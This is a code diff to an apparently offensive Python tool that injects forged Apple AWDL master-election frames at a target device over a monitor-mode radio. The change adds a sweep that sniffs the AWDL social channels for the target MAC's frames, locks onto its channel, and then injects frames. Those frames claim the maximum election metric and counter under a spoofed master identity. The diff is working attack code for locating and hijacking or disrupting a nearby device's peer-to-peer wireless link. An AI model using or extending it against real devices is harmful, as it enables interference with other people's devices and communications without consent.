@@ -62,9 +62,11 @@ import argparse
 import fcntl
 import os
 import random
+import shutil
 import signal
 import socket
 import struct
+import subprocess
 import sys
 import time
 
@@ -122,6 +124,13 @@ PSF_INTERVAL_MASTER_TU = 110
 UINT32_MAX = 0xFFFFFFFF
 
 BROADCAST = b"\xff\xff\xff\xff\xff\xff"
+
+# The only channels AWDL ever uses (the "social" channels), swept in this order
+# when no channel is given explicitly.
+AWDL_SOCIAL_CHANNELS = [6, 44, 149]
+SWEEP_DWELL_DEFAULT = 3.0        # seconds listened on each channel while sweeping
+
+ETH_P_ALL = 0x0003               # receive every frame on the monitor interface
 
 
 # ---------------------------------------------------------------------------
@@ -415,15 +424,103 @@ class AwdlFrameBuilder:
 # ---------------------------------------------------------------------------
 
 def open_injection_socket(ifname):
-    """Open a raw AF_PACKET socket bound to a monitor-mode interface."""
+    """Open a raw AF_PACKET socket bound to a monitor-mode interface.
+
+    Opened with ETH_P_ALL so the same socket can both inject frames and sniff
+    them (used by the channel sweep).
+    """
     try:
-        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
+                             socket.htons(ETH_P_ALL))
         sock.bind((ifname, 0))
     except PermissionError:
         sys.exit("error: need root to open a raw socket (try sudo)")
     except OSError as exc:
         sys.exit("error: cannot bind to interface %r: %s" % (ifname, exc))
     return sock
+
+
+def set_channel(ifname, channel):
+    """Tune ``ifname`` to ``channel`` via ``iw``. Returns True on success."""
+    try:
+        subprocess.run(["iw", "dev", ifname, "set", "channel", str(channel)],
+                       check=True, stdout=subprocess.DEVNULL,
+                       stderr=subprocess.PIPE)
+        return True
+    except FileNotFoundError:
+        print("    channel %d: cannot tune ('iw' not found)" % channel)
+        return False
+    except subprocess.CalledProcessError as exc:
+        reason = exc.stderr.decode(errors="replace").strip() or "rejected"
+        print("    channel %d: cannot tune (%s)" % (channel, reason))
+        return False
+
+
+def parse_awdl_src(buf):
+    """If ``buf`` is an AWDL action frame, return its source MAC, else None.
+
+    ``buf`` is a received monitor-mode frame: radiotap header + 802.11 frame.
+    """
+    if len(buf) < 4:
+        return None
+    rt_len = struct.unpack_from("<H", buf, 2)[0]      # radiotap it_len
+    # need the 24-byte 802.11 management header + the start of the action body
+    if len(buf) < rt_len + 24 + 5:
+        return None
+    frame_control = struct.unpack_from("<H", buf, rt_len)[0]
+    # management (type 0) + action (subtype 13) => low byte 0xD0
+    if frame_control & 0x00FC != 0x00D0:
+        return None
+    src = buf[rt_len + 10:rt_len + 16]                # addr2 = transmitter
+    body = buf[rt_len + 24:]
+    # action body: category(127) + OUI(00:17:f2) + type(8)
+    if body[0] == IEEE80211_VENDOR_SPECIFIC and body[1:4] == AWDL_OUI \
+            and body[4] == AWDL_TYPE:
+        return src
+    return None
+
+
+def _drain(sock):
+    """Discard any buffered frames so a sweep window only counts fresh ones."""
+    sock.setblocking(False)
+    try:
+        while True:
+            sock.recv(4096)
+    except (BlockingIOError, OSError):
+        pass
+    finally:
+        sock.setblocking(True)
+
+
+def sweep_for_channel(sock, ifname, target, channels, dwell):
+    """Listen on each candidate channel and return the one with the most AWDL
+    frames from ``target`` (or None if the target is seen nowhere)."""
+    print("[*] sweeping for %s on channels %s (%.1fs each)"
+          % (mac_str(target), ",".join(str(c) for c in channels), dwell))
+    counts = {}
+    for ch in channels:
+        if not set_channel(ifname, ch):
+            continue
+        time.sleep(0.2)             # let the radio settle on the new channel
+        _drain(sock)
+        n = 0
+        sock.settimeout(0.5)
+        end = time.monotonic() + dwell
+        while time.monotonic() < end:
+            try:
+                buf = sock.recv(4096)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            if parse_awdl_src(buf) == target:
+                n += 1
+        counts[ch] = n
+        print("    channel %3d: %d AWDL frame(s) from target" % (ch, n))
+    sock.settimeout(None)
+    if not counts or max(counts.values()) == 0:
+        return None
+    return max(counts, key=counts.get)
 
 
 DEVCLASS_NAMES = {
@@ -447,8 +544,13 @@ def main(argv=None):
     parser.add_argument("-s", "--source", type=parse_mac, default=None,
                         help="source MAC / master identity to advertise "
                              "(default: interface MAC, else random local MAC)")
-    parser.add_argument("-c", "--channel", type=int, default=44,
-                        choices=sorted(CHAN_OPCLASS), help="AWDL social channel")
+    parser.add_argument("-c", "--channel", type=int, default=None,
+                        choices=sorted(CHAN_OPCLASS),
+                        help="AWDL social channel; if omitted, the channel is "
+                             "detected by sweeping for the target's frames")
+    parser.add_argument("--sweep-dwell", type=float, default=SWEEP_DWELL_DEFAULT,
+                        metavar="SECONDS",
+                        help="listen time per channel during channel detection")
     parser.add_argument("--metric", type=lambda x: int(x, 0), default=UINT32_MAX,
                         help="election master metric (default: 0xffffffff = max)")
     parser.add_argument("--counter", type=lambda x: int(x, 0), default=UINT32_MAX,
@@ -506,8 +608,43 @@ def main(argv=None):
     metric = args.metric & UINT32_MAX
     counter = args.counter & UINT32_MAX
 
+    # Resolve the channel. If none was given, open the radio and sweep the
+    # social channels for the target's AWDL frames, then lock onto the one it
+    # is actually on. In --dry-run there is no live radio, so fall back to 44.
+    sock = None
+    if args.dry_run:
+        channel = args.channel if args.channel is not None else 44
+        if args.channel is None:
+            print("# note: no -c given; using channel %d for --dry-run "
+                  "(detection needs a live radio)" % channel)
+    else:
+        sock = open_injection_socket(args.interface)
+        channel = args.channel
+        have_iw = shutil.which("iw") is not None
+        if channel is None:
+            if not have_iw:
+                sock.close()
+                sys.exit("error: 'iw' is required to detect the channel; "
+                         "install it or pass -c/--channel")
+            channel = sweep_for_channel(sock, args.interface, args.target,
+                                        AWDL_SOCIAL_CHANNELS, args.sweep_dwell)
+            if channel is None:
+                sock.close()
+                sys.exit("error: target %s not seen on any AWDL channel; "
+                         "pass -c/--channel to set it manually"
+                         % mac_str(args.target))
+            print("[*] detected target on channel %d" % channel)
+            if not set_channel(args.interface, channel):
+                sock.close()
+                sys.exit("error: could not tune interface to channel %d" % channel)
+        elif have_iw:
+            set_channel(args.interface, channel)  # best-effort; may be tuned already
+        else:
+            print("[*] 'iw' not found; assuming %s is already on channel %d"
+                  % (args.interface, channel))
+
     builder = AwdlFrameBuilder(
-        src=src, dst=args.target, channel=args.channel,
+        src=src, dst=args.target, channel=channel,
         master_metric=metric, master_counter=counter,
         self_metric=metric, self_counter=counter,
         hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
@@ -519,7 +656,7 @@ def main(argv=None):
         frame = builder.build(AWDL_ACTION_MIF)
         print("# source (master) : %s" % mac_str(src))
         print("# target (dst)    : %s" % mac_str(args.target))
-        print("# channel         : %d" % args.channel)
+        print("# channel         : %d" % channel)
         print("# election counter : 0x%08x" % counter)
         print("# election metric  : 0x%08x" % metric)
         print("# aw/af period     : %d / %d TU" % (args.aw_period, args.af_period))
@@ -529,13 +666,13 @@ def main(argv=None):
         print(frame.hex())
         return 0
 
-    sock = open_injection_socket(args.interface)
+    # sock was opened above while resolving the channel.
 
     # graceful Ctrl-C
     stop = {"flag": False}
     signal.signal(signal.SIGINT, lambda *_: stop.update(flag=True))
 
-    print("[*] injecting AWDL MIF on %s (ch %d)" % (args.interface, args.channel))
+    print("[*] injecting AWDL MIF on %s (ch %d)" % (args.interface, channel))
     print("    master   : %s  (counter=0x%08x metric=0x%08x)"
           % (mac_str(src), counter, metric))
     print("    directed at: %s" % mac_str(args.target))
